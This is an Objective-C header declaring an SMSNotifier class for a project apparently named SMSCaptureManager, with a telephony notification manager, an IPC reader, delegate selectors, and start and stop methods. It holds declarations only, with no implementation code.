//
//  SMSNotifier.h
//  SMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@protocol TelephonyNotificationManager;

@interface SMSNotifier : NSObject <MessagePortIPCDelegate> {
@private
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	MessagePortIPCReader				*mMessagePortReader;
	
	id	mDelegate;
	SEL	mEventsSelector;
	SEL mEventSelector;
	
	NSMutableArray		*mSMSInfoArray;
}

@property (nonatomic, assign) id mDelegate;
@property (nonatomic, assign) SEL mEventsSelector;
@property (nonatomic, assign) SEL mEventSelector;

- (id) initWithTelephonyNotificationManager: (id <TelephonyNotificationManager>) aTelephonyNotificationManager;

- (void) start;
- (void) stop;

@end
